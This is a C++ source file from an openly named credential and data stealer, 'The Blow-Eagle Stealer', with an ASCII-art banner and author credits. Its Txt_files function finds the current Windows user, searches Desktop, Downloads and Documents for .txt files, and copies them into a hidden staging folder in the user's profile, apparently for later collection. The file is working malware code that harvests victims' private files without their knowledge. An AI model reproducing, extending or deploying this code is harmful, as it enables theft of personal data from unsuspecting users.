/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|

-----------------------------------------------------------------
|by: Nick_Vinesmoke                                             |
|Autor github: https://github.com/Nick-Vinesmoke                |
|Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
-----------------------------------------------------------------
*/

#include "../targets.h"
#include "../../config/config.cpp"
#include  "../../helper/helper.h"


std::string getFileNameWithoutExtension(const std::string& filePath)
{
	size_t lastSlashIndex = filePath.find_last_of("\\/");
	size_t lastDotIndex = filePath.find_last_of(".");

	if (lastDotIndex != std::string::npos && lastDotIndex > lastSlashIndex)
	{
		return filePath.substr(lastSlashIndex + 1, lastDotIndex - lastSlashIndex - 1);
	}

	return "";
}

void files::Txt_files()
{
	printf("Txt_files\n");

	std::string user = func::GetUser();

	

	std::string dirs[] = 
	{
		"/Desktop",
		"/Downloads",
		"/Documents"
	};

	std::string defaultPaths[] = 
	{
		"C:/Users/" + user + config::path + "/Files_TXT",
		"C:/Users/" + user + config::path + "/Files_TXT/Desktop",
		"C:/Users/" + user + config::path + "/Files_TXT/Downloads",
		"C:/Users/" + user + config::path + "/Files_TXT/Documents"
	};

	for (size_t j = 0; j < std::size(defaultPaths); j++)
	{
		int result = _mkdir(defaultPaths[j].c_str());

	}

	std::vector<std::string> filePaths;

	for (size_t i = 0; i < std::size(dirs); i++)
	{
		if (std::filesystem::exists("C:/Users/" + user + dirs[i]))
		{
			try 
			{
				func::GetFilePaths("C:/Users/" + user + dirs[i], filePaths, ".txt");

				int counter = 0;
				for (const std::string& filePath : filePaths)
				{
					func::copyFile(filePath, defaultPaths[0] + dirs[i] + "/" + getFileNameWithoutExtension(filePath) + '_' + std::to_string(counter) + ".txt");
					counter++;
				}
			}
			catch (const char* error_message)
			{
				std::cout << error_message << std::endl;
			}
		}
	}
}